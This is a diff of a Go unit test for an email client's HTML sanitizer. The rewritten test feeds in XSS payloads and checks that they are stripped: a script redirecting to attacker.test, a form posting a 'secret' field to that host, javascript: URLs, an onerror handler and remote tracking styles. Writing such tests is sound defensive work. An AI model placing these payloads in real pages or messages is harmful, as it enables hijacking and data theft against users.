@@ -286,56 +286,53 @@ func TestTransformAttachment(t *testing.T) {
 }
 
 func TestSanitizeHTML(t *testing.T) {
-	// Test with script tag
-	html := `<html><body><script>alert('xss')</script><p>Safe content</p><a href="http://example.com" target="_blank">Link</a></body></html>`
-	sanitized := sanitizeHTML(html)
-
-	if len(sanitized) == 0 {
-		t.Error("Sanitized HTML should not be empty")
-	}
-	// Script should be removed
-	if len(sanitized) >= len(html) {
-		t.Error("Sanitized HTML should be shorter (script removed)")
-	}
-	if strings.Contains(sanitized, "<script>") {
-		t.Error("Script tag should be removed from sanitized HTML")
-	}
-
-	// Test with link element (should be allowed if attributes are permitted)
-	html2 := `<html><head><link rel="stylesheet" href="style.css"></head><body><p>Content</p></body></html>`
-	sanitized2 := sanitizeHTML(html2)
-	// Note: bluemonday may remove link elements even if allowed, depending on context
-	// We test that sanitization works without error
-	if len(sanitized2) == 0 {
-		t.Error("Sanitized HTML should not be empty")
-	}
-	// If link is preserved, it should have allowed attributes
-	if strings.Contains(sanitized2, "<link") {
-		// Verify that the link element has the expected attributes if present
-		if !strings.Contains(sanitized2, "rel") && !strings.Contains(sanitized2, "href") {
-			t.Error("Link element should have rel or href attribute if preserved")
+	malicious := `<script>top.location='https://attacker.test'</script>` +
+		`<form action="https://attacker.test"><input name="secret"></form>` +
+		`<a href="javascript:alert(1)" target="_top">bad</a>` +
+		`<img src="javascript:alert(2)" onerror="alert(3)">`
+	cleaned := sanitizeHTML(malicious)
+	for _, forbidden := range []string{"<script", "<form", "<input", "javascript:", "onerror", `_top`} {
+		if strings.Contains(strings.ToLower(cleaned), strings.ToLower(forbidden)) {
+			t.Errorf("sanitized HTML retained %q: %s", forbidden, cleaned)
 		}
 	}
 
-	// Test with anchor tag with target attribute (should be allowed)
-	html3 := `<a href="http://example.com" target="_blank">Link</a>`
-	sanitized3 := sanitizeHTML(html3)
-	if !strings.Contains(sanitized3, "target") {
-		t.Error("Target attribute should be allowed on anchor tags")
+	links := sanitizeHTML(`<a href="https://example.com/path" target="_self" rel="opener">external</a>`)
+	for _, required := range []string{`href="https://example.com/path"`, `target="_blank"`, "nofollow", "noreferrer", "noopener"} {
+		if !strings.Contains(links, required) {
+			t.Errorf("safe external link is missing %q: %s", required, links)
+		}
+	}
+	if strings.Contains(links, `rel="opener`) {
+		t.Errorf("unsafe rel policy survived: %s", links)
 	}
 
-	// Test with empty HTML
-	html4 := ""
-	sanitized4 := sanitizeHTML(html4)
-	if sanitized4 != "" {
+	stylesheets := sanitizeHTML(`<link rel="stylesheet" href="https://cdn.example.test/mail.css" type="text/css" media="screen">` +
+		`<link rel="preload" href="https://tracker.example.test/pixel">`)
+	if !strings.Contains(stylesheets, "stylesheet") || !strings.Contains(stylesheets, `https://cdn.example.test/mail.css`) {
+		t.Errorf("constrained stylesheet link was removed: %s", stylesheets)
+	}
+	if strings.Contains(stylesheets, "preload") || strings.Contains(stylesheets, "tracker.example.test") {
+		t.Errorf("non-stylesheet link survived: %s", stylesheets)
+	}
+
+	normal := sanitizeHTML(`<table style="width: 100%; border-collapse: collapse"><tr><td style="color: #123456; padding: 8px"><img src="cid:logo@example.test" style="max-width: 240px"></td></tr></table>`)
+	for _, required := range []string{"<table", "width: 100%", "border-collapse: collapse", "color: #123456", "padding: 8px", `src="cid:logo@example.test"`, "max-width: 240px"} {
+		if !strings.Contains(normal, required) {
+			t.Errorf("normal email markup is missing %q: %s", required, normal)
+		}
+	}
+
+	remoteStyle := sanitizeHTML(`<div style="background-image: url(https://tracker.example.test/pixel); color: red; position: fixed">safe</div>`)
+	if strings.Contains(remoteStyle, "tracker.example.test") || strings.Contains(remoteStyle, "background-image") || strings.Contains(remoteStyle, "position") {
+		t.Errorf("fetching or positioning style survived: %s", remoteStyle)
+	}
+	if !strings.Contains(remoteStyle, "color: red") {
+		t.Errorf("safe inline style was removed: %s", remoteStyle)
+	}
+
+	if sanitized := sanitizeHTML(""); sanitized != "" {
 		t.Error("Empty HTML should return empty string")
-	}
-
-	// Test with only safe content
-	html5 := `<p>Safe content</p><div>More content</div>`
-	sanitized5 := sanitizeHTML(html5)
-	if !strings.Contains(sanitized5, "Safe content") {
-		t.Error("Safe content should be preserved")
 	}
 }
 
